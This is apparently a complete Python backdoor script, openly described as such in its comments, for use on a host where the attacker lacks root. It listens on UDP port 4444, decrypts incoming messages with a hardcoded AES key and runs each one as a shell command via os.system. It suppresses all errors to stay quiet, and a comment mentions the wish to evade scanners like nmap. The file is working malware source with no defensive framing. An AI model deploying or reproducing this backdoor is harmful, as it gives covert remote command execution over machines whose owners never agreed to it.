# This is a UDP backdoor intended to be run when you cannot operate as
# root. Since we are not root we can't open up a raw socket and so we use the
# SOCK_DGRAM availble to us.

import base64
import json
import os
import signal
import socket
import sys

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 4444
BUFFER_SIZE = 1024
SECRET_KEY = b"keep the change ya filthy animal"

def parse_structured_message(structured_message):
    json_str = structured_message.decode('utf-8')
    data_dict = json.loads(json_str)
    iv = base64.b64decode(data_dict['iv'])
    cipher_text = base64.b64decode(data_dict['cipher_text'])

    return cipher_text, iv


def main():
    # bind a UDP socket. In a cooler version of this I would
    # like this to be a raw socket, and respond with ICMP Type 3 even when
    # we get data to fool scanners like nmap, but we can't do that if we
    # aren't root so this backdoor is good if you are an unprivledged user
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN_IP, LISTEN_PORT))

    while True:
        try:
            data, addr = sock.recvfrom(BUFFER_SIZE)
            cipher_text, iv = parse_structured_message(data)

            aes_dec = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
            message = unpad(aes_dec.decrypt(cipher_text), AES.block_size)
            command = message.decode('utf-8')

            os.system(command)
            
        # Silently catch all errors when people send nonsense
        except Exception as e:
            pass

if __name__ == "__main__":
    main()
